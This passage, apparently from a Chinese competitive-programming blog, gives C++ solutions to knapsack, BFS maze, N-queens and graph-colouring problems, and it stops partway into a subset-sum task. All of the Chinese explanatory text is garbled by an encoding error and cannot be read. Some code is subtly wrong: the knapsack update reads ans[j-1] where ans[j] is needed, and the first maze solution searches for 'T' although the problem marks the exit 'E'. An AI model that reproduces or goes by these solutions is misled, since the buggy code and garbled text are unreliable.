class="hljs-keyword">while</span>(T--)&#123;<span class="hljs-keyword">int</span> ans=<span class="hljs-number">0</span>;<span class="hljs-built_in">cin</span>&gt;&gt;m&gt;&gt;n;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<span class="hljs-built_in">cin</span>&gt;&gt;w[i];&#125;sort(w,w+n);<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<span class="hljs-keyword">if</span>(m&gt;=w[i])&#123;ans++;m-=w[i];&#125;<span class="hljs-keyword">else</span><span class="hljs-keyword">break</span>; &#125; <span class="hljs-built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="hljs-built_in">endl</span>;&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h2 id="é—®é¢˜-E-æå†°é˜²å¾¡â€”â€”ç›¾å±±"><a href="#é—®é¢˜-E-æå†°é˜²å¾¡â€”â€”ç›¾å±±" class="headerlink" title="é—®é¢˜ E: æå†°é˜²å¾¡â€”â€”ç›¾å±±"></a>é—®é¢˜ E: æå†°é˜²å¾¡â€”â€”ç›¾å±±</h2><h3 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>ç›¾å±±æ˜¯ç‹è€…å³¡è°·é‡Œçš„è¾…åŠ©ï¼Œä¸€å¤«å½“å…³ã€ä¸‡å¤«è«å¼€ï¼Œä¸€ä¸ªå¥½çš„è¾…åŠ©å¾€å¾€å¯ä»¥ç»™å›¢é˜Ÿå¸¦æ¥æå¤§å¸®åŠ©ã€‚</p><p>ç›¾å±±çš„æ¸¸æˆä¸­çš„ä¸€ä¸ªæŠ€èƒ½ä¸ºä¸åŠ¨å¦‚å±±ï¼šæ‰‹æ¡ä¸€å—ç”±çŸ³å¤´ç»„æˆçš„å·¨ç›¾ï¼Œå¼ å¼€å·¨ç›¾ç ¸å‘åœ°é¢ï¼Œå°†æ•Œäººæ¨å¼€ï¼Œå¹¶æŒç»­ä¸€æ®µæ—¶é—´ã€‚</p><p>å‡è®¾ç›¾å±±æœ€å¤šåªèƒ½æ‰¿å—Cé‡é‡çš„ç›¾ç‰Œï¼Œè€Œç°åœ¨æœ‰Nä¸ªå°çŸ³å¤´ï¼Œæ¯ä¸ªçŸ³å¤´içš„é‡é‡ä¸ºWiï¼Œé˜²å¾¡å€¼ä¸ºPiã€‚é‚£ä¹ˆï¼Œå‘†èŒçš„ç›¾å±±æƒ³çŸ¥é“ï¼Œä»–ä»Nä¸ªå°çŸ³å¤´ä¸­æŒ‘é€‰Mä¸ªï¼ˆM&lt;=Nï¼‰ç»„æˆä»–å¯æ‰¿å—ç›¾ç‰Œï¼Œæœ€å¤§çš„é˜²å¾¡å€¼æ˜¯å¤šå°‘ï¼Ÿ</p><h3 id="è¾“å…¥-4"><a href="#è¾“å…¥-4" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h3><p>å¤šç»„æµ‹è¯•ç”¨ä¾‹ã€‚<br>ç¬¬ä¸€è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°Tï¼ˆ1&lt;=T&lt;=10ï¼‰ï¼Œä»£è¡¨æµ‹è¯•ç”¨ä¾‹ä¸ªæ•°ã€‚</p><p>æ¥ä¸‹æ¥æœ‰Tç»„æµ‹è¯•ç”¨ä¾‹ã€‚æ¯ç»„æµ‹è¯•ç”¨ä¾‹ç¬¬ä¸€è¡Œä¸ºç›¾å±±æ‰¿å—ç›¾ç‰Œçš„æœ€å¤§é‡é‡C(C&lt;10000)å’Œå°çŸ³å¤´çš„ä¸ªæ•°N(N&lt;1000)ã€‚æ¥ä¸‹æ¥çš„Nè¡Œåˆ†åˆ«ä¸ºå°çŸ³å¤´çš„é‡é‡Wi(1&lt;=Wi&lt;=100)å’Œé˜²å¾¡å€¼Pi(1&lt;=Pi&lt;=3000000)ã€‚</p><h3 id="è¾“å‡º-4"><a href="#è¾“å‡º-4" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><p>æ¯ç»„æµ‹è¯•ç”¨ä¾‹å¯¹åº”ä¸€è¡Œè¾“å‡ºï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªæ•´æ•°ansï¼Œä»£è¡¨å¯æ‰¿å—ç›¾ç‰Œçš„æœ€å¤§é˜²å¾¡å€¼ã€‚</p><h3 id="æ ·ä¾‹è¾“å…¥-4"><a href="#æ ·ä¾‹è¾“å…¥-4" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><pre><code class="hljs basic"><span class="hljs-number">1</span><span class="hljs-symbol">10 </span><span class="hljs-number">5</span><span class="hljs-symbol">2 </span><span class="hljs-number">6</span><span class="hljs-symbol">2 </span><span class="hljs-number">3</span><span class="hljs-symbol">6 </span><span class="hljs-number">5</span><span class="hljs-symbol">5 </span><span class="hljs-number">4</span><span class="hljs-symbol">4 </span><span class="hljs-number">6</span></code></pre><h3 id="æ ·ä¾‹è¾“å‡º-4"><a href="#æ ·ä¾‹è¾“å‡º-4" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><pre><code class="hljs plain">15</code></pre><h3 id="æç¤º-4"><a href="#æç¤º-4" class="headerlink" title="æç¤º"></a>æç¤º</h3><p>01èƒŒåŒ…é—®é¢˜ï¼Œä¸çŸ¥é“ä¸‹é¢çš„è§£èƒ½ä¸èƒ½è¿‡</p><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">5</span>;<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> ans[N];<span class="hljs-keyword">int</span> w[N],v[N];<span class="hljs-keyword">int</span> T;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">cin</span>&gt;&gt;T;<span class="hljs-keyword">while</span>(T--)&#123;<span class="hljs-keyword">int</span> C,N;<span class="hljs-built_in">memset</span>(ans,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(ans));<span class="hljs-built_in">cin</span>&gt;&gt;C&gt;&gt;N;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++)&#123;<span class="hljs-built_in">cin</span>&gt;&gt;w[i]&gt;&gt;v[i];&#125;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++)&#123;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=C;j&gt;=w[i];j--)ans[j]=max(ans[j<span class="hljs-number">-1</span>],ans[j-w[i]]+v[i]);&#125;<span class="hljs-comment">//for(int i=0;i&lt;=C;i++)</span><span class="hljs-comment">//cout&lt;&lt;ans[i]&lt;&lt;endl;</span><span class="hljs-built_in">cout</span>&lt;&lt;ans[C]&lt;&lt;<span class="hljs-built_in">endl</span>;&#125; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>ps:ä»¥ä¸Šä»£ç æ²¡æœ‰æäº¤æµ‹è¯•ç¯å¢ƒï¼Œåªæ˜¯è¿‡äº†ç»™å‡ºçš„æµ‹è¯•æ ·ä¾‹ã€‚</p><h1 id="dfså¤§åˆé›†"><a href="#dfså¤§åˆé›†" class="headerlink" title="dfså¤§åˆé›†"></a>dfså¤§åˆé›†</h1><h2 id="è¿·å®«é—®é¢˜"><a href="#è¿·å®«é—®é¢˜" class="headerlink" title="è¿·å®«é—®é¢˜"></a>è¿·å®«é—®é¢˜</h2><h3 id="é¢˜ç›®æè¿°-5"><a href="#é¢˜ç›®æè¿°-5" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>å°æ˜ç½®èº«äºä¸€ä¸ªè¿·å®«ï¼Œè¯·ä½ å¸®å°æ˜æ‰¾å‡ºä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€çŸ­è·¯ç¨‹ã€‚<br>å°æ˜åªèƒ½å‘ä¸Šä¸‹å·¦å³å››ä¸ªæ–¹å‘ç§»åŠ¨ã€‚</p><p>è¾“å…¥</p><p>è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ã€‚è¾“å…¥çš„ç¬¬ä¸€è¡Œæ˜¯ä¸€ä¸ªæ•´æ•°Tï¼Œè¡¨ç¤ºæœ‰Tç»„æµ‹è¯•æ•°æ®ã€‚<br>æ¯ç»„è¾“å…¥çš„ç¬¬ä¸€è¡Œæ˜¯ä¸¤ä¸ªæ•´æ•°Nå’ŒMï¼ˆ1&lt;=N,M&lt;=100ï¼‰ã€‚<br>æ¥ä¸‹æ¥Nè¡Œï¼Œæ¯è¡Œè¾“å…¥Mä¸ªå­—ç¬¦ï¼Œæ¯ä¸ªå­—ç¬¦è¡¨ç¤ºè¿·å®«ä¸­çš„ä¸€ä¸ªå°æ–¹æ ¼ã€‚<br>å­—ç¬¦çš„å«ä¹‰å¦‚ä¸‹ï¼š<br>â€˜Sâ€™ï¼šèµ·ç‚¹<br>â€˜Eâ€™ï¼šç»ˆç‚¹<br>â€˜-â€™ï¼šç©ºåœ°ï¼Œå¯ä»¥é€šè¿‡<br>â€˜#â€™ï¼šéšœç¢ï¼Œæ— æ³•é€šè¿‡<br>è¾“å…¥æ•°æ®ä¿è¯æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªèµ·ç‚¹å’Œç»ˆç‚¹ã€‚</p><p>è¾“å‡º</p><p>å¯¹äºæ¯ç»„è¾“å…¥ï¼Œè¾“å‡ºä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€çŸ­è·¯ç¨‹ï¼Œå¦‚æœä¸å­˜åœ¨ä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„è·¯ï¼Œåˆ™è¾“å‡º-1ã€‚</p><h3 id="æ ·ä¾‹è¾“å…¥-5"><a href="#æ ·ä¾‹è¾“å…¥-5" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><pre><code class="hljs asciidoc">15 5s-###-----##---E#------##</code></pre><h3 id="æ ·ä¾‹è¾“å‡º-5"><a href="#æ ·ä¾‹è¾“å‡º-5" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><pre><code class="hljs plain">9</code></pre><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;queue&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;algorithm&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">int</span> de[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<span class="hljs-comment">//è®¡æ­¥æ•°ç»„  è®°å½•èµ°åˆ°è¿™ä¸ªä½ç½®æ‰€éœ€çš„æ­¥æ•° ä¸èƒ½èµ°åˆ°çš„ä½ç½®æ ‡è®°ä¸º-1 </span><span class="hljs-keyword">char</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];  <span class="hljs-comment">//ç”¨äºå­˜æ”¾è¿·å®«åœ°å›¾ </span><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">pair</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt; P;  <span class="hljs-comment">//åæ ‡</span><span class="hljs-keyword">int</span> to[<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;  <span class="hljs-comment">//åœ¨å½“å‰åæ ‡ä¸‹èƒ½èµ°çš„å››ä¸ªæ–¹å‘</span><span class="hljs-keyword">int</span> sx,ex,sy,ey;  <span class="hljs-comment">//(sx,sy)ä¸ºèµ·ç‚¹åæ ‡  ï¼ˆex,eyï¼‰ä¸ºç»ˆç‚¹åæ ‡</span><span class="hljs-keyword">int</span> x,y,nx,ny; <span class="hljs-comment">//(x,y)ä¸ºå‡½æ•°ä¸­å½“å‰ä½ç½®åæ ‡   ï¼ˆnx,ny)ä¸ºæ¥ä¸‹æ¥èƒ½åˆ°è¾¾çš„åæ ‡ </span><span class="hljs-keyword">int</span> r,l;  <span class="hljs-comment">//rä¸ºè¡Œæ•° lä¸ºåˆ—æ•° </span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bfs</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">memset</span>(de,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span>(de));<span class="hljs-built_in">queue</span>&lt;P&gt; qu;qu.push(P(sx,sy));   <span class="hljs-comment">//å°†èµ·ç‚¹åæ ‡æ”¾å…¥é˜Ÿå¤´ </span>de[sx][sy]=<span class="hljs-number">0</span>;<span class="hljs-keyword">while</span>(!qu.empty()) &#123;P p=qu.front();   <span class="hljs-comment">//å–å‡ºé˜Ÿå¤´åæ ‡ </span>qu.pop() ;<span class="hljs-comment">//åˆ é™¤å¯¹å¤´åŠèµ°è¿‡çš„åæ ‡ </span>x=p.first,y=p.second; <span class="hljs-keyword">if</span>(x==ex&amp;&amp;y==ey) <span class="hljs-keyword">break</span>; <span class="hljs-comment">//åˆ°è¾¾ç»ˆç‚¹ è·³å‡ºå¾ªç¯</span> <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)&#123;nx=x+to[<span class="hljs-number">0</span>][i];<span class="hljs-comment">//å¼€å§‹å‘å››ä¸ªæ–¹å‘ç§»åŠ¨ </span>ny=y+to[<span class="hljs-number">1</span>][i];<span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span>&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;l&amp;&amp;<span class="hljs-built_in">map</span>[nx][ny]!=<span class="hljs-string">&#x27;#&#x27;</span>&amp;&amp;de[nx][ny]==<span class="hljs-number">-1</span>) <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦è¶Šç•Œ ä»¥åŠæ˜¯å¦èƒ½èµ°  æ’é™¤èµ°è¿‡çš„è·¯ </span> &#123;     qu.push(P(nx,ny));      <span class="hljs-comment">//å°†èƒ½èµ°çš„åæ ‡æ”¾å…¥é˜Ÿåˆ— ä¹‹åä¾æ¬¡åˆ é™¤ </span>    de[nx][ny]=de[x][y]+<span class="hljs-number">1</span>;  <span class="hljs-comment">//æ­¥æ•°åŠ ä¸€ </span>&#125;   &#125;&#125;<span class="hljs-keyword">if</span>(de[ex][ey]==<span class="hljs-number">-1</span>)  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">//ç»ˆç‚¹çš„è®°æ­¥æ•°ç»„ä¸º-1 åŠä¸èƒ½åˆ°è¾¾ç»ˆç‚¹ </span><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> de[ex][ey]; &#125; <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> n,i,j;<span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n)&#123;<span class="hljs-keyword">while</span>(n--)&#123;<span class="hljs-built_in">cin</span>&gt;&gt;r&gt;&gt;l;<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;r;i++)&#123;<span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;l;j++)&#123; <span class="hljs-built_in">cin</span>&gt;&gt;<span class="hljs-built_in">map</span>[i][j];<span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">&#x27;S&#x27;</span>) <span class="hljs-comment">//è®°å½•èµ·ç‚¹åæ ‡ </span> &#123;sx=i,sy=j; &#125;  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">&#x27;T&#x27;</span>)  <span class="hljs-comment">//è®°å½•ç»ˆç‚¹åæ ‡ </span> &#123; ex=i,ey=j; &#125;&#125;&#125;<span class="hljs-built_in">cout</span>&lt;&lt;bfs()&lt;&lt;<span class="hljs-built_in">endl</span>;&#125;&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h2 id="acwingè¿·å®«é—®é¢˜"><a href="#acwingè¿·å®«é—®é¢˜" class="headerlink" title="acwingè¿·å®«é—®é¢˜"></a>acwingè¿·å®«é—®é¢˜</h2><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">105</span>;<span class="hljs-keyword">int</span> mp[N][N];<span class="hljs-keyword">int</span> dis[N][N];<span class="hljs-keyword">typedef</span> <span class="hljs-built_in">pair</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt; P;<span class="hljs-keyword">int</span> n,m;<span class="hljs-keyword">int</span> to[<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;<span class="hljs-keyword">int</span> x,y,nx,ny;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">memset</span>(dis,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span>(dis));<span class="hljs-built_in">queue</span>&lt;P&gt; qu;qu.push(P(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>));dis[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<span class="hljs-keyword">while</span>(!qu.empty())&#123;P p=qu.front();qu.pop();x=p.first,y=p.second;<span class="hljs-keyword">if</span>(x==n<span class="hljs-number">-1</span>&amp;&amp;y==m<span class="hljs-number">-1</span>) <span class="hljs-keyword">break</span>;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)&#123;nx=x+to[<span class="hljs-number">0</span>][i],ny=y+to[<span class="hljs-number">1</span>][i];<span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span>&amp;&amp;nx&lt;n&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;m&amp;&amp;dis[nx][ny]==<span class="hljs-number">-1</span>&amp;&amp;mp[nx][ny]==<span class="hljs-number">0</span>)&#123;qu.push(P(nx,ny));dis[nx][ny]=dis[x][y]+<span class="hljs-number">1</span>;&#125; &#125; &#125;<span class="hljs-keyword">if</span>(dis[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>]!=<span class="hljs-number">-1</span>)<span class="hljs-built_in">cout</span>&lt;&lt;dis[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>];<span class="hljs-keyword">return</span>; &#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;m;j++)<span class="hljs-built_in">cin</span>&gt;&gt;mp[i][j];dfs();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h2 id="nçš‡åé—®é¢˜"><a href="#nçš‡åé—®é¢˜" class="headerlink" title="nçš‡åé—®é¢˜"></a>nçš‡åé—®é¢˜</h2><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">int</span> n,ans=<span class="hljs-number">0</span>;<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">20</span>;<span class="hljs-keyword">char</span> m[N][N];<span class="hljs-keyword">bool</span> col[N],dg[N],udg[N];<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> u)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">if</span>(u==n)&#123;<span class="hljs-comment">//for(int i=0;i&lt;n;i++)</span><span class="hljs-comment">//cout&lt;&lt;m[i]&lt;&lt;endl;</span>ans++;<span class="hljs-keyword">return</span>;&#125;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<span class="hljs-keyword">if</span>(!col[i]&amp;&amp;!dg[i+u]&amp;&amp;!udg[n-u+i])&#123;m[u][i]=<span class="hljs-string">&#x27;Q&#x27;</span>;col[i]=dg[i+u]=udg[n-u+i]=<span class="hljs-number">1</span>;dfs(u+<span class="hljs-number">1</span>);col[i]=dg[i+u]=udg[n-u+i]=<span class="hljs-number">0</span>;<span class="hljs-comment">//å›æº¯æ¢å¤ç°åœº </span>m[u][i]=<span class="hljs-string">&#x27;.&#x27;</span>;&#125;&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">cin</span>&gt;&gt;n;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)m[i][j]=<span class="hljs-string">&#x27;.&#x27;</span>;dfs(<span class="hljs-number">0</span>);<span class="hljs-built_in">cout</span>&lt;&lt;ans;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h2 id="må›¾ç€è‰²é—®é¢˜"><a href="#må›¾ç€è‰²é—®é¢˜" class="headerlink" title="må›¾ç€è‰²é—®é¢˜"></a>må›¾ç€è‰²é—®é¢˜</h2><h3 id="é¢˜ç›®æè¿°-6"><a href="#é¢˜ç›®æè¿°-6" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>ç»™å®šæ— å‘è¿é€šå›¾Gå’Œmç§ä¸åŒçš„é¢œè‰²ï¼Œç”¨è¿™äº›é¢œè‰²ç»™å›¾çš„å„ä¸ªé¡¶ç‚¹ç€ä¸€ç§é¢œè‰²ï¼Œè‹¥æŸç§æ–¹æ¡ˆä½¿å¾—å›¾ä¸­æ¯æ¡è¾¹çš„2ä¸ªé¡¶ç‚¹çš„é¢œè‰²éƒ½ä¸ç›¸åŒï¼Œåˆ™æ˜¯ä¸€ä¸ªæ»¡è¶³çš„æ–¹æ¡ˆï¼Œæ‰¾å‡ºæ‰€æœ‰çš„æ–¹æ¡ˆã€‚</p><h3 id="è¾“å…¥-5"><a href="#è¾“å…¥-5" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h3><p>ç¬¬ä¸€è¡Œæœ‰3ä¸ªæ­£æ•´æ•°nï¼Œkå’Œmï¼Œåˆ†åˆ«è¡¨ç¤ºnä¸ªé¡¶ç‚¹ï¼Œkæ¡è¾¹ï¼Œmç§é¢œè‰²<br>æ¥ä¸‹æ¥kè¡Œï¼Œæ¯è¡Œ2ä¸ªæ­£æ•´æ•°ï¼Œè¡¨ç¤ºä¸€æ¡è¾¹çš„ä¸¤ä¸ªé¡¶ç‚¹</p><h3 id="è¾“å‡º-5"><a href="#è¾“å‡º-5" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><p>æ‰€æœ‰ä¸åŒçš„ç€è‰²æ–¹æ¡ˆæ•°</p><h3 id="æ ·ä¾‹è¾“å…¥-6"><a href="#æ ·ä¾‹è¾“å…¥-6" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><pre><code class="hljs basic"><span class="hljs-symbol">5 </span><span class="hljs-number">8</span> <span class="hljs-number">4</span> <span class="hljs-symbol">1 </span><span class="hljs-number">2</span><span class="hljs-symbol">1 </span><span class="hljs-number">3</span> <span class="hljs-symbol">1 </span><span class="hljs-number">4</span><span class="hljs-symbol">2 </span><span class="hljs-number">3</span><span class="hljs-symbol">2 </span><span class="hljs-number">4</span><span class="hljs-symbol">2 </span><span class="hljs-number">5</span><span class="hljs-symbol">3 </span><span class="hljs-number">4</span><span class="hljs-symbol">4 </span><span class="hljs-number">5</span></code></pre><h3 id="æ ·ä¾‹è¾“å‡º-6"><a href="#æ ·ä¾‹è¾“å‡º-6" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><pre><code class="hljs plain">48</code></pre><h3 id="æç¤º-5"><a href="#æç¤º-5" class="headerlink" title="æç¤º"></a>æç¤º</h3><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">105</span>;<span class="hljs-keyword">int</span> mp[N][N];<span class="hljs-keyword">int</span> color[N]=&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">int</span> n,k,m,ans=<span class="hljs-number">0</span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> d)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">if</span>(d==n+<span class="hljs-number">1</span>)&#123;ans++;<span class="hljs-keyword">return</span>;&#125;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)&#123;<span class="hljs-keyword">int</span> flag=<span class="hljs-number">1</span>;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)&#123;<span class="hljs-keyword">if</span>(mp[d][j]&amp;&amp;color[j]==i)&#123;flag=<span class="hljs-number">0</span>;<span class="hljs-keyword">break</span>;&#125; &#125; <span class="hljs-keyword">if</span>(flag) &#123;  color[d]=i; dfs(d+<span class="hljs-number">1</span>); color[d]=<span class="hljs-number">0</span>;  &#125;  &#125; &#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;k&gt;&gt;m;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;k;i++)&#123;<span class="hljs-keyword">int</span> t1,t2;<span class="hljs-built_in">cin</span>&gt;&gt;t1&gt;&gt;t2;mp[t1][t2]=<span class="hljs-number">1</span>;mp[t2][t1]=<span class="hljs-number">1</span>;&#125;dfs(<span class="hljs-number">1</span>);<span class="hljs-built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="hljs-built_in">endl</span>;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h2 id="éƒ¨åˆ†å’Œ"><a href="#éƒ¨åˆ†å’Œ" class="headerlink" title="éƒ¨åˆ†å’Œ"></a>éƒ¨åˆ†å’Œ</h2><h3 id="é¢˜ç›®æè¿°-7"><a href="#é¢˜ç›®æè¿°-7" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>ç»™å®šnä¸ªæ•´æ•°ï¼Œåˆ¤æ–­æ˜¯å¦å¯ä»¥ä»ä¸­é€‰æ‹©è‹¥å¹²æ•°å­—ï¼Œä½¿å¾—ä»–ä»¬çš„å’Œæ°å¥½ä¸ºkã€‚</p><h3 id="è¾“å…¥-6"><a href="#è¾“å…¥-6" class="headerlink" 